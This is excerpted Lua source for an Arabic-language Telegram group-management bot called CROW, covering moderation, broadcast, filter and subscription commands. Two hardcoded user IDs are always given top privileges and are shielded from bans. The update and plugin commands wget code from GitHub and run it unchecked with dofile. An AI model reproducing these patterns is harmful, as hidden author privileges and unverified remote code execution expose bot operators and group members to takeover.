...
SUDO = SUDO
sudo_users = {SUDO,1800292529,1186878655}   
print([[
...
io.popen("cd library && wget https://raw.githubusercontent.com/jx8xj/CROW/main/library/redis.lua") 
...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/jx8xj/Files_CROW/main/File_Bot/commands.lua") 
...
if hash or SudoBot(msg) or DevCROW(msg) or Sudo(msg) or Bot(msg)  then  
return true  
else  
return false  
end  
...
if hash or SudoBot(msg) or DevCROW(msg) or Bot(msg)  then  
return true  
else  
return false  
end  
...
if hash or SudoBot(msg) or DevCROW(msg) or Sudo(msg) or SudoBotCoSu(msg) or Bot(msg)  then   
return true 
else 
return false 
end 
...
if hash or SudoBot(msg) or DevCROW(msg) or Sudo(msg) or BasicConstructor(msg) or SudoBotCoSu(msg) or Bot(msg)  then   
return true
else
return false
end 
...
if hash or SudoBot(msg) or DevCROW(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or SudoBotCoSu(msg) or Bot(msg)  then   
return true
else
return false
end 
...
if hash or SudoBot(msg) or DevCROW(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or SudoBotCoSu(msg) or Bot(msg)  then   
return true
else
return false
end 
...
if hash or SudoBot(msg) or DevCROW(msg) or Sudo(msg) or BasicConstructor(msg) or Constructor(msg) or Manager(msg) or Mod(msg) or SudoBotCoSu(msg) or Bot(msg)  then   
return true 
else 
return false 
end 
...
if tonumber(user_id) == tonumber(1800292529) then  
var = true  
elseif tonumber(user_id) == tonumber(1186878655) then
var = true  
...
CROW_Msg = 'قمة التفاعل'
elseif msgs < 5500 then 
CROW_Msg = 'اقوى متفاعل' 
elseif msgs < 7000 then 
CROW_Msg = 'ملك التفاعل' 
elseif msgs < 9500 then 
CROW_Msg = 'امبروطور التفاعل' 
...
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"@xritc")  
...
--------------------------------------------------------------------------------------------------------------
function SourceCROW(msg,data) -- بداية العمل امـيـر الـ دلـيـم
if msg then
...
local list = database:smembers(bot_id.."CROW1:List:Filter"..sl)
...
if not DevCROW(msg) and not database:sismember(bot_id..'Ban:User_Bot',msg.sender_user_id_) and not database:get(bot_id..'Tuasl:Bots') then
...
if DevCROW(msg) and msg.reply_to_message_id_ ~= 0  then
...
send(msg.chat_id_, msg.id_,CROW_Msg) 
return false  
end 
if text then
...
if text == 'تفعيل التواصل ⌯' and DevCROW(msg) then  
...
if text == 'تعطيل التواصل ⌯' and DevCROW(msg) then  
...
if text == 'تفعيل البوت الخدمي ⌯' and DevCROW(msg) then  
...
if text == 'تعطيل البوت الخدمي ⌯' and DevCROW(msg) then  
...
if text == 'ضع كليشه ستارت ⌯' and DevCROW(msg) then 
database:set(bot_id..'Start:Bots',true) 
send(msg.chat_id_, msg.id_,' *⌯︙ارسل لي الكليشه الان*')
return false
end
if text == 'حذف كليشه ستارت ⌯' and DevCROW(msg) then 
database:del(bot_id..'Start:Bot') 
send(msg.chat_id_, msg.id_,' *⌯︙تم حذف كليشه ستارت*')
end
if text == 'معلومات السيرفر ⌯' and DevCROW(msg) then 
...
if text == 'تحديث السورس ⌯' and DevCROW(msg) then 
os.execute('rm -rf CROW.lua')
os.execute('wget https://raw.githubusercontent.com/jx8xj/CROW/main/CROW.lua')
send(msg.chat_id_, msg.id_,' *⌯︙تم تحديث السورس* \n*⌯︙لديك اخر اصدار لسورس الغراب*\n*⌯︙الاصدار » { 2.8v}*')
dofile('CROW.lua')  
end
if text == 'الاصدار ⌯' and DevCROW(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,' *⌯︙اصدار سورس الغراب* \n*⌯︙الاصدار »{ 2.8v}*')
end
if text == 'قناه تحديثات البوت ⌯' and DevCROW(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,' ⌯︙[تحديثات البوت](t.me/jx8xj) \n⌯︙[قناه السورس](t.me/vvvmh)')
end
if text == "ضع اسم للبوت ⌯" and DevCROW(msg) then  
database:setex(bot_id..'Set:Name:Bot'..msg.sender_user_id_,300,true) 
send(msg.chat_id_, msg.id_," *⌯︙ارسل اليه الاسم الان* ")
return false
end
if text == 'الاحصائيات ⌯' and DevCROW(msg) then 
...
if text == 'المشتركين ⌯' and DevCROW(msg) then 
local Groups = database:scard(bot_id..'Chek:Groups')  
local Users = database:scard(bot_id..'User_Bot')  
Text = '\n *⌯︙المشتركين» {`'..Users..'`}*'
send(msg.chat_id_, msg.id_,Text) 
...
if text == 'الكروبات ⌯' and DevCROW(msg) then 
local Groups = database:scard(bot_id..'Chek:Groups')  
local Users = database:scard(bot_id..'User_Bot')  
Text = '\n *⌯︙الكروبات» {`'..Groups..'`}*'
send(msg.chat_id_, msg.id_,Text) 
...
if text == ("المطورين ⌯") and DevCROW(msg) then
...
if text == ("قائمه العام ⌯") and DevCROW(msg) then
...
if text == ("قائمه الكتم العام ⌯") and DevCROW(msg) then
...
if text=="اذاعه خاص ⌯" and msg.reply_to_message_id_ == 0 and DevCROW(msg) then 
database:setex(bot_id.."Send:Bc:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," *⌯︙ارسل الان اذاعتك؟* \n*⌯︙للخروج ارسل الغاء* ")
return false
end 
if text=="اذاعه ⌯" and msg.reply_to_message_id_ == 0 and DevCROW(msg) then 
database:setex(bot_id.."Send:Bc:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," *⌯︙ارسل الان اذاعتك؟* \n*⌯︙للخروج ارسل الغاء* ")
return false
end  
if text=="اذاعه بالتثبيت ⌯" and msg.reply_to_message_id_ == 0 and DevCROW(msg) then 
database:setex(bot_id.."Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," *⌯︙ارسل الان اذاعتك؟* \n*⌯︙للخروج ارسل الغاء* ")
return false
end 
if text=="اذاعه بالتوجيه ⌯" and msg.reply_to_message_id_ == 0  and DevCROW(msg) then 
database:setex(bot_id.."Send:Fwd:Grops" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," *⌯︙ارسل لي التوجيه الان*")
return false
end 
if text=="اذاعه بالتوجيه خاص ⌯" and msg.reply_to_message_id_ == 0  and DevCROW(msg) then 
database:setex(bot_id.."Send:Fwd:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_, msg.id_," ⌯︙ارسل لي التوجيه الان")
return false
end 
if text == 'جلب نسخه الاحتياطيه ⌯' and DevCROW(msg) then 
GetFile_Bot(msg)
end
if text == "تنظيف المشتركين ⌯" and DevCROW(msg) then
...
if text == "تنظيف الكروبات ⌯" and DevCROW(msg) then 
...
send(msg.chat_id_, msg.id_,'*⌯︙عدد الكروبات الان » { '..#group..' }'..CROWk..''..CROW..'*\n*⌯︙الان عدد الكروبات الحقيقي » { '..sendok..' } كروبات*\n')   
end
end
end,nil)
end
...
if text and text:match("^رفع مطور @(.*)$") and DevCROW(msg) then
...
if text and text:match("^رفع مطور (%d+)$") and DevCROW(msg) then
...
if text and text:match("^تنزيل مطور @(.*)$") and DevCROW(msg) then
...
if text and text:match("^تنزيل مطور (%d+)$") and DevCROW(msg) then
...
local CROW1_Msg = database:get(bot_id.."CROW1:Add:Filter:Rp2"..text..msg.chat_id_)   
if CROW1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
...
--------------------------------------------------------------------------------------------------------------
if CROW_Msg and not Special(msg) then  
local CROW_Msg = database:get(bot_id.."Add:Filter:Rp2"..text..msg.chat_id_)   
if CROW_Msg then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
...
if tonumber(data.member_count_) < tonumber(database:get(bot_id..'Num:Add:Bot') or 0) and not DevCROW(msg) then
...
if text and text:match("^ضع عدد الاعضاء (%d+)$") and DevCROW(msg) then
...
if text and text:match("^تغير الاشتراك$") and DevCROW(msg) then  
database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, ' *⌯︙حسنآ ارسل لي معرف القناة*')
return false  
end
if text and text:match("^تغير رساله الاشتراك$") and DevCROW(msg) then  
database:setex(bot_id.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, ' *⌯︙حسنآ ارسل لي النص الذي تريده*')
return false  
end
if text == "حذف رساله الاشتراك ⌯" and DevCROW(msg) then  
database:del(bot_id..'text:ch:user')
send(msg.chat_id_, msg.id_, " *⌯︙تم مسح رساله الاشتراك* ")
return false  
end
if text and text:match("^وضع قناة الاشتراك ⌯$") and DevCROW(msg) then  
database:setex(bot_id.."add:ch:jm" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 360, true)  
send(msg.chat_id_, msg.id_, ' *⌯︙حسنآ ارسل لي معرف القناة*')
return false  
end
if text == "تفعيل الاشتراك الاجباري ⌯" and DevCROW(msg) then  
...
if text == "تعطيل الاشتراك الاجباري ⌯" and DevCROW(msg) then  
database:del(bot_id..'add:ch:id')
database:del(bot_id..'add:ch:username')
send(msg.chat_id_, msg.id_, " *⌯︙تم تعطيل الاشتراك الاجباري* ")
return false  
end
if text == "الاشتراك الاجباري ⌯" and DevCROW(msg) then  
if database:get(bot_id..'add:ch:username') then
local addchusername = database:get(bot_id..'add:ch:username')
...
database:sadd(bot_id.."CROW:blocname"..msg.chat_id_, BlNe)
end
...
local All_name = database:smembers(bot_id.."CROW:blocname"..msg.chat_id_)
...
if t2.id_ then 
name_CROW = ((t2.first_name_ or "") .. (t2.last_name_ or ""))
if name_CROW then 
names_CROW = database:smembers(bot_id.."CROW:blocname"..msg.chat_id_) or ""
if names_CROW and names_CROW[1] then 
for i=1,#names_CROW do 
if name_CROW:match("(.*)("..names_CROW[i]..")(.*)") then 
...
database:set(bot_id.."CROW:teh"..msg.chat_id_,teh)
end
...
database:set(bot_id.."CROW:nump"..msg.chat_id_,nump)
end
if text == "التوحيد" then
local s1 = database:get(bot_id.."CROW:teh"..msg.chat_id_) or "لا يوجد توحيد"
local s2 = database:get(bot_id.."CROW:nump"..msg.chat_id_) or 5
...
if database:get(bot_id.."kt:twh:stats"..msg.chat_id_) == "open"  and database:get(bot_id.."CROW:teh"..msg.chat_id_) then 
id = msg.sender_user_id_
function amir_CROWa_new(CROW1,CROW2)
if CROW2 and CROW2.first_name_ then 
if CROW2.first_name_:match("(.*)"..database:get(bot_id.."CROW:teh"..msg.chat_id_).."(.*)") then 
database:srem(bot_id.."CROW:Muted:User"..msg.chat_id_, msg.sender_user_id_)
else
local CROW_nnn = database:get(bot_id.."CROW:nump"..msg.chat_id_) or 5
local CROW_nnn2 = database:get(bot_id.."CROW:nump22"..msg.chat_id_..msg.sender_user_id_) or 0
if (tonumber(CROW_nnn2) == tonumber(CROW_nnn) or tonumber(CROW_nnn2) > tonumber(CROW_nnn)) then 
database:sadd(bot_id..'Muted:User'..msg.chat_id_, msg.sender_user_id_)
else 
database:incrby(bot_id.."CROW:nump22"..msg.chat_id_..msg.sender_user_id_,1)
send(msg.chat_id_, msg.id_, "⌯︙عزيزي >>["..CROW2.username_.."](https://t.me/"..(CROW2.username_ or "vvvmh")..")\n⌯︙عليك وضع التوحيد ⪼ {"..database:get(bot_id.."CROW:teh"..msg.chat_id_).."} بجانب اسمك\n⌯︙عدد المحاولات المتبقيه {"..(tonumber(CROW_nnn) - tonumber(CROW_nnn2)).."}")
end
end
end
end
bnnaGet(id, amir_CROWa_new)
end
end
...
local CROWChengName = database:get(bot_id.."CROW:Cheng:Name"..data.id_)
if not data.first_name_ then 
if CROWChengName then 
send(msg.chat_id_, msg.id_, " خوش معرف جان ["..CROWChengName..']')
database:del(bot_id.."CROW:Cheng:Name"..data.id_) 
end
end
if data.first_name_ then 
if CROWChengName ~= data.first_name_ then 
local Text = {
  "جان خوش اسم يول",
...
database:set(bot_id.."CROW:Cheng:Name"..data.id_, data.first_name_) 
end
end
end
end,nil)   
...
if data.id_ then 
if data.id_ ~= bot_id then
local CROWChengUserName = database:get(bot_id.."CROW:Cheng:UserName"..data.id_)
if not data.username_ then 
if CROWChengUserName then 
send(msg.chat_id_, msg.id_, 1, "حذف معرفه خمطو بساع بساع  \n هاذه معرفه  : [@"..CROWChengUserName..']')
database:del(bot_id.."CROW:Cheng:UserName"..data.id_) 
end
end
if data.username_ then 
if CROWChengUserName ~= data.username_ then 
local Text = {
...
database:set(bot_id.."CROW:Cheng:UserName"..data.id_, data.username_) 
end
end
end
end,nil)   
...
if data.id_ then 
if data.id_ ~= bot_id then 
local CROWChengPhoto = database:get(bot_id.."CROW:Cheng:Photo"..data.id_)
if not data.profile_photo_ then 
if CROWChengPhoto then 
send(msg.chat_id_, msg.id_, "حذف كل صور ابن الحلو شكد غبي لعد😂🥺")
database:del(bot_id.."CROW:Cheng:Photo"..data.id_) 
end
end
if data.profile_photo_.big_.persistent_id_ then 
if CROWChengPhoto ~= data.profile_photo_.big_.persistent_id_ then 
local Text = {
...
database:set(bot_id.."CROW:Cheng:Photo"..data.id_, data.profile_photo_.big_.persistent_id_) 
end
end
end
end,nil)   
...
send(msg.chat_id_,msg.id_,'⌯︙شترك في قناة السورس اولآ @jx8xj .')
return false 
end
Text = "ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ sᴏᴜʀᴄᴇ ᴄʀᴏᴡ\n\n[⌯  ᴄʀᴏᴡ ᴄʜᴀɴɴᴇʟ](http://t.me/jx8xj)\n\n[⌯  ɪɴғᴏ sᴏᴜʀᴄᴇ](http://t.me/vvvmh)\n\n[⌯  ᴄʀᴏᴡ ᴅᴇᴠᴇʟᴏᴘᴇʀ](http://t.me/xritc)\n\n[⌯  ʙᴏᴛ ᴄʀᴏᴡ](http://t.me/IOlIIbot)"
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '⌯ sᴏᴜʀᴄᴇ ᴄʀᴏᴡ',url="t.me/jx8xj/3"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/jx8xj&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
--------------------------------------------------------------------------------------------------------------
if Chat_Type == 'GroupBot' and ChekAdd(msg.chat_id_) == true then
if text == 'رفع نسخه الاحتياطيه' and DevCROW(msg) then  
if tonumber(msg.reply_to_message_id_) > 0 then
...
------------------------------------------------------------------------ امـيـر الـدلـيـم
if text == 'تحديث' and DevCROW(msg) then
dofile('CROW.lua')  
send(msg.chat_id_, msg.id_, ' *⌯︙تم تحديث جميع الملفات*') 
end 
if text == ("مسح قائمه العام") and DevCROW(msg) then
...
if text == ("حظر عام") and msg.reply_to_message_id_ and DevCROW(msg) then  
function start_function(extra, result, success)
if CROWSudoBot(result.sender_user_id_) then
...
if text and text:match("^حظر عام @(.*)$")  and DevCROW(msg) then  
...
if CROWSudoBot(result.id_) then
send(msg.chat_id_, msg.id_,"*⌯︙لا تستطيع (كتم،طرد،حظر،تققيد) مطور السورس او الاساسي*")
return false 
end
...
if text and text:match("^حظر عام (%d+)$") and DevCROW(msg) then  
local userid = text:match("^حظر عام (%d+)$")
if CROWSudoBot(userid) then
send(msg.chat_id_, msg.id_,"*⌯︙لا تستطيع (كتم،طرد،حظر،تققيد) مطور السورس او الاساسي*")
return false 
end
...
if text == ("كتم عام") and msg.reply_to_message_id_ and DevCROW(msg) then  
function start_function(extra, result, success)
if CROWSudoBot(result.sender_user_id_) then
send(msg.chat_id_, msg.id_,"*⌯︙لا تستطيع (كتم،طرد،حظر،تققيد) مطور السورس او الاساسي*")
return false 
...
if text and text:match("^كتم عام @(.*)$")  and DevCROW(msg) then  
...
if text and text:match("^كتم عام (%d+)$") and DevCROW(msg) then  
local userid = text:match("^كتم عام (%d+)$")
if CROWSudoBot(bot_id) then
send(msg.chat_id_, msg.id_,"*⌯︙لا تستطيع (كتم،طرد،حظر،تققيد) مطور السورس او الاساسي*")
return false 
end
if tonumber(userid) == tonumber(bot_id) then  
...
if text == ("الغاء العام") and msg.reply_to_message_id_ and DevCROW(msg) then  
function start_function(extra, result, success)
...
if text and text:match("^الغاء العام @(.*)$") and DevCROW(msg) then  
...
if text and text:match("^الغاء العام (%d+)$") and DevCROW(msg) then  
...
------------------------------------------------------------------------ امـيـر الـدلـيـم
if text == ("مسح المطورين") and DevCROW(msg) then
...
if text == 'الملفات' and DevCROW(msg) then
t = ' *⌯︙ملفات السورس الغراب ↓*\n*•━━━━━━ 𝐶𝑅 ━━━━━━━•* \n'
i = 0
for v in io.popen('ls File_Bot'):lines() do
if v:match(".lua$") then
i = i + 1
...
if DevCROW(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/jx8xj/Files_CROW/main/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n *⌯︙اهلا بك في متجر ملفات الغراب*\n*⌯︙ملفات السورس ↓*\n*•━━━━━━ 𝐶𝑅 ━━━━━━━•*\n\n"
...
if text and text:match("^(تعطيل) (.*)(.lua)$") and DevCROW(msg) then
...
local json_file, res = https.request("https://raw.githubusercontent.com/jx8xj/Files_CROW/main/File_Bot/"..file)
if res == 200 then
os.execute("rm -fr File_Bot/"..file)
send(msg.chat_id_, msg.id_,t) 
dofile('CROW.lua')  
else
send(msg.chat_id_, msg.id_," *⌯︙عذرا الملف لايدعم سورس الغراب* \n") 
end
return false
end
if text and text:match("^(تفعيل) (.*)(.lua)$") and DevCROW(msg) then
...
if text == "مسح الملفات" and DevCROW(msg) then
os.execute("rm -fr File_Bot/*")
send(msg.chat_id_,msg.id_," *⌯︙تم مسح الملفات*")
return false
end

if text == ("رفع مطور") and msg.reply_to_message_id_ and DevCROW(msg) then  
function start_function(extra, result, success)
...
if text == ("تنزيل مطور") and msg.reply_to_message_id_ and DevCROW(msg) then  
function start_function(extra, result, success)
...
function Function_CROW(extra, result, success)
...
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_CROW, nil)
return false 
end
...
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_CROW, nil)
return false 
end
...
local TEXT_SUD = database:get(bot_id..'CROW:TEXT_SUDO')
if TEXT_SUDO then 
...
database:set(bot_id.."CROW1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"rep")  
return false  
end    
if text then   
local tsssst = database:get(bot_id.."CROW1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if tsssst == "rep" then   
send(msg.chat_id_, msg.id_," *⌯︙ارسل التحذير عند ارسال الكلمه*")  
database:set(bot_id.."CROW1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"repp")  
database:set(bot_id.."CROW1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
database:sadd(bot_id.."CROW1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
if text then  
local test = database:get(bot_id.."CROW1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test == "repp" then  
send(msg.chat_id_, msg.id_," *⌯︙تم منع الكلمه مع التحذير*")  
database:del(bot_id.."CROW1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
local test = database:get(bot_id.."CROW1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
if text then   
database:set(bot_id.."CROW1:Add:Filter:Rp2"..test..msg.chat_id_, text)  
end  
database:del(bot_id.."CROW1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
return false  end  
end

if text == "الغاء منع" and msg.reply_to_message_id_ == 0 and Manager(msg) then    
send(msg.chat_id_, msg.id_," *⌯︙ارسل الكلمه الان*")  
database:set(bot_id.."CROW1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
return false  end
if text then 
local test = database:get(bot_id.."CROW1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
...
database:del(bot_id.."CROW1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."CROW1:Add:Filter:Rp2"..text..msg.chat_id_)  
database:srem(bot_id.."CROW1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
...
local list = database:smembers(bot_id.."CROW1:List:Filter"..msg.chat_id_)  
for k,v in pairs(list) do  
database:del(bot_id.."CROW1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."CROW1:Add:Filter:Rp2"..v..msg.chat_id_)  
database:srem(bot_id.."CROW1:List:Filter"..msg.chat_id_,v)  
end  
...
if text == 'مسح كليشه المطور' and DevCROW(msg) then
database:del(bot_id..'TEXT_SUDO')
send(msg.chat_id_, msg.id_,' *⌯︙تم مسح كليشه المطور*')
end
if text == 'ضع كليشه المطور' and DevCROW(msg) then
...
if text == 'تفعيل الاذاعه' and DevCROW(msg) then  
...
if text == 'تعطيل الاذاعه' and DevCROW(msg) then  
...
if text == ""..(database:get(bot_id..'Name:Bot') or 'الغراب').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or 'الغراب')
local CROW_Msg = {
'عمغي 🥺💕.',
'هاا شتريد كافي ☹️.',
'مشايف بوت شني 😂.',
...
send(msg.chat_id_, msg.id_,'['..CROW_Msg[math.random(#CROW_Msg)]..']') 
return false
end
if text=="اذاعه خاص" and msg.reply_to_message_id_ == 0 and Sudo(msg) then 
if database:get(bot_id..'Bc:Bots') and not DevCROW(msg) then 
...
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub('-100',''), offset_ = 0,limit_ = 200},function(ta,CROW)
local t = "\n*ツ قائمة الاعضاء* \n*•━━━━━━ 𝐶𝑅 ━━━━━━━•*\n"
x = 0
local list = CROW.members_
for k, v in pairs(list) do
x = x + 1
...
if CROWSudoBot(msg.sender_user_id_) then
database:srem(bot_id..'DEV:Sudo:T', result.sender_user_id_)
database:srem(bot_id..'Sudo:User', result.sender_user_id_)
database:srem(bot_id..'CoSu'..msg.chat_id_, result.sender_user_id_)
database:srem(bot_id..'Basic:Constructor'..msg.chat_id_,result.sender_user_id_)
...
if text == ("مسح ردود المطور") and DevCROW(msg) then 
...
if text == ("ردود المطور") and DevCROW(msg) then 
local list = database:smembers(bot_id..'List:Rd:Sudo')
text = "\n ⌯︙قائمة ردود المطور \n*•━━━━━━ 𝐶𝑅 ━━━━━━━•*\n"
for k,v in pairs(list) do
...
if text == 'اضف رد للكل' and DevCROW(msg) then    
send(msg.chat_id_, msg.id_,' *⌯︙ارسل الكلمه تريد اضافتها*')
database:set(bot_id..'Set:Rd'..msg.sender_user_id_..':'..msg.chat_id_,true)
return false 
end
if text == 'حذف رد للكل' and DevCROW(msg) then    
...
if text == ""..(database:get(bot_id..'Name:Bot') or 'الغراب').." غادر" or text == 'غادر' then  
...
if text == 'تفعيل المغادره' and DevCROW(msg) then   
...
if text == 'تعطيل المغادره' and DevCROW(msg) then  
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n*⌯︙العضو »* ['..data.first_name_..'](t.me/'..(data.username_ or 'jx8xj')..') '
...
-- vardump(data) 
CROWdx(msg.chat_id_, msg.id_, ' *⌯︙ايدي المجموعة » ( '..msg.chat_id_..' )*\n*⌯︙عدد الادمنيه » ( '..data.administrator_count_..' )*\n*⌯︙عدد المحظورين » ( '..data.kicked_count_..' )*\n*⌯︙عدد الاعضاء » ( '..data.member_count_..' )*\n', 'md') 
end 
...
if text == 'استعاده الاوامر' and DevCROW(msg) then
...
*⌯م10 ◂ اوامر الاعضاء*
ٴ*•━━━━━━ 𝐶𝑅 ━━━━━━━•*ٴ
[آݪغـــرآبــــ 𝑇𝐻𝐸 𝐶𝑅𝑂𝑊 ](t.me/vvvmh) 
]]
keyboard = {} 
keyboard.inline_keyboard = {
...
{{text = 'آݪغـــرآبــــ 𝑇𝐻𝐸 𝐶𝑅𝑂𝑊', url="t.me/jx8xj"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
...
{{text = 'آݪغـــرآبــــ 𝑇𝐻𝐸 𝐶𝑅𝑂𝑊', url="t.me/jx8xj"}},
{{text = 'مطور السورس', url="t.me/xritc"}},
}
...
zh = https.request('https://vvvzvv.ml/amirZhfa/CROW.php?en='..URL.escape(TextZhrfa)..'')
zx = JSON.decode(zh)
t = "\n*⌯︙قائمه الزخرفه* \nٴ⌯∫ٴ*•━━━━━━ 𝐶𝑅 ━━━━━━━•*ٴ⌯∫○ٴ \n"
i = 0
...
send(msg.chat_id_, msg.id_, t..'ٴ⌯∫ٴ*•━━━━━━ 𝐶𝑅 ━━━━━━━•*ٴ⌯∫○ٴ\n⌯︙[آݪغـــرآبــــ 𝑇𝐻𝐸 𝐶𝑅𝑂𝑊](t.me/vvvmh) ')
end
...
gk = https.request('https://vvvzvv.ml/amirBrg/CROW.php?br='..URL.escape(Textbrj)..'')
br = JSON.decode(gk)
i = 0
...
ge = https.request('https://vvvzvv.ml/amirOmr/CROW.php?age='..URL.escape(Textage)..'')
ag = JSON.decode(ge)
i = 0
...
data,res = https.request('https://vvvzvv.ml/amirVois/CROW.php')
if res == 200 then
...
{{text = 'sᴏᴜʀᴄᴇ ᴄʀᴏᴡ',url='http://t.me/jx8xj'}},
}
...
*⌯~⪼ الاشعارات*
*ٴ•━━━━━━ 𝐶𝑅 ━━━━━━━•*
[⍆ آݪغـــرآبــــ 𝑇𝐻𝐸 𝐶𝑅𝑂𝑊](t.me/jx8xj)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'اوامر الحمايه', callback_data="/help1"},{text = 'اوامر الادمنيه', callback_data="/help2"}},
...
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'الغراب')
...
CROW = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(CROW)
...
------------------------------------------------------------------------
local CROWAbot = database:get(bot_id.."CROW1:Add:Filter:Rp2"..text..result.chat_id_)   
if CROWAbot then
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0," *⌯︙العضو :* {["..data.first_name_.."](T.ME/"..data.username_..")}\n⌯︙["..CROWAbot.."] \n") 
...
------------------------------------------------------------------------
if text then
local CROW1_Msg = database:get(bot_id.."CROW1:Add:Filter:Rp2"..text..result.chat_id_)   
if CROW1_Msg then
send(msg.chat_id_, msg.id_," ⌯︙"..CROW1_Msg)
